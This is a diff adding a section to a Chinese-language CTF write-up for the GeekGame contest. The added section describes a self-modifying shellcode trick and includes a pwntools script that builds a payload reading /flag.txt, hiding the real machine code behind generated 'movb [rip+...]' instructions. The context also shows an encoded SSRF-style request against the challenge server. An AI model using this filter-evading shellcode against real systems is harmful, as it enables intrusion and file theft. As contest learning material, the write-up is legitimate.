@@ -900,6 +900,42 @@ $ http -f 'http://prob08-xxxxxx.geekgame.pku.edu.cn/admin/localhost%3A8080%252Fb
 
 这道题的后面两问我都没做出来。我实在想不出来在这样严格的正则表达式的过滤之后，如何 RCE。
 
+# 简单题
+
+因为我在算地址偏移的时候犯了很愚蠢的错误，我没能在第一阶段结束前作出这道题。所以喜提分数 -67%.
+
+写个 Python 脚本来生成机器码。
+
+先用 shellcraft 生成实际要执行的机器码。
+
+然后对于目标机器码的每一个字节。我们生成一条 `mov` 指令把这个字节追加所有 mov 指令的后面去。
+
+也就是说，生成的一大坨 `mov` 指令会把实际要执行的机器码释放出来。`mov` 指令执行完之后，释放出来的指令会被执行。
+
+```python
+from pwn import *
+from base64 import b64encode
+code = shellcraft.amd64.linux.cat("/flag.txt")
+
+print(code)
+byt = asm(code, arch='amd64')
+print(byt.hex())
+l = len(byt)
+print(len(byt))
+
+asms = []
+for (i, b) in enumerate(byt):
+    asms.append(f"movb [rip+{ l * 7 - 0x7 * i + i - 6 } ], {b}")
+shellcode = asm('\n'.join(asms), arch="amd64")
+with open("prob10/a.bin", "wb") as f:
+    f.write(shellcode)
+
+print(shellcode)
+print(b64encode(shellcode))
+```
+
+![image-20221126121533958](assets/image-20221126121533958.png)
+
 # 编原译理习题课 · 实验班
 
 安全的 Rust 代码怎么会段错误呢？？？
